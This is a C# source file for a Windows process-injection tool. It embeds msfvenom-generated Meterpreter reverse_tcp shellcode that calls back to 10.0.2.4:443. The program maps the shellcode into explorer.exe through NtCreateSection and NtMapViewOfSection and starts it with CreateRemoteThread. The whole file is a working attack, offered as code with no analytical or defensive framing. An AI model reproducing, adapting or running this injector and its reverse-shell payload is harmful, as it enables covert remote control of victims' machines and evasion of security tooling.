﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Process_Injection_Nt_CSharp
{
    class Program
    {
        // OpenProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // CreateRemoteThread - kernel32.dll
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        // GetCurrentProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        // ntdll.dll API functions:
        // NtCreateSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        // NtMapViewOfSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        // NtUnmapViewOfSection
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        // NtClose
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        static int Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
            0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,
            0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
            0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
            0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
            0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
            0x0a,0x00,0x02,0x04,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
            0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
            0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
            0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
            0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
            0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
            0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
            0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
            0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
            0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
            0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
            0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
            0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
            0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
            0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
            0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
            0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
            0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
            0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
            0xd5};

            long buffer_size = buf.Length;

            // Create the section handle.
            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while creating the section.");
                return -1;
            }
            Console.WriteLine("[+] The section has been created successfully.");
            Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));

            // Map a view of a section into the virtual address space of the current process.
            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                return -1;
            }
            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
            Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

            // Copy the shellcode into the mapped section.
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            // Map a view of the section in the virtual address space of the targeted process.
            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                return -1;
            }
            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
            Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

            // Unmap the view of the section from the current process & close the handle.
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
    }
}
